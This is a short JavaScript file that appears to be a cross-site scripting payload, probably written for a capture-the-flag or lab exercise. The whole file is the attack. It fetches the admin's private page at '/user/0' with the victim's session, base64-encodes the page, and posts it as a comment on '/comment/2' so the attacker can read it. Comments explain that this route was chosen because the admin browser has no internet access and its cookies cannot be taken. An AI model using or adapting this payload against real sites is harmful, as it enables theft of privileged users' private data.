

//Send Get request to Admin private page
function GetAdmin(){
    var admin = new XMLHttpRequest();
    admin.open("GET", "/user/0", false);
    admin.send();
    var response = admin.responseText;
    return response;
}

//Sending the Admin private page as post to user2 commont - Because the admin doesn't have interest access only to the website and it also can't get his cookie since it is https
function GetAdminPage(response){
    var datapost = new XMLHttpRequest();
    var params = "comment=" + btoa(response);
    datapost.open("POST", "/comment/2", true);
    datapost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    datapost.send(params);
}




var res = GetAdmin();
GetAdminPage(res);